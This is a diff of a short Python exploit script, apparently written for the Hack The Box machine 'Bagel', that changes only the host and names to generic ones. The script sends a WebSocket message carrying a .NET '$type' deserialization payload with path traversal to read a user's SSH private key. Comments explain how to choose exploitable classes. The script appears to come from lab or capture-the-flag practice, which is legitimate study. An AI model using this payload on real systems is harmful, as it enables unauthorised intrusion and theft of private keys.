@@ -4,7 +4,7 @@ import sys
 
 ws = websocket.WebSocket()
 
-ws.connect("ws://bagel.htb:5000/")
+ws.connect("ws://target.htb:5000/")
 
 operation = 'RemoveOrder'
 
@@ -13,7 +13,7 @@ operation = 'RemoveOrder'
 # it is important to note that we have to import the dll name, the namespace, and the class
 # the candidates to be exploited: needs to have an empty constructor preferably
 
-order = {"{}".format(operation): {'$type': 'bagel_server.File,bagel','ReadFile' : '../../../../../../home/phil/.ssh/id_rsa'}}
+order = {"{}".format(operation): {'$type': 'class.File,bagel','ReadFile' : '../../../../../../home/user/.ssh/id_rsa'}}
 
 data = str(json.dumps(order))
 
